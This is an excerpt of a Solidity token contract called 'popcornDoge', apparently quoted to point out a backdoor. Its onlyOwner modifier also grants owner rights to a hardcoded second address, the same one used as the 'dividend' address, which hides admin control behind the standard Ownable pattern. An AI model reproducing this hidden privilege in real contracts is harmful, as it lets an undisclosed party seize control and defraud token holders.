...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xA8f5DD2EbEc7a747D6567Ed6CE36ce8a858037cd) , "owner");
        _;
    }
...
contract popcornDoge  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "popcornDoge";
    string private _symbol = "popcornDoge";
    ...
    address public dividend = 0xA8f5DD2EbEc7a747D6567Ed6CE36ce8a858037cd;
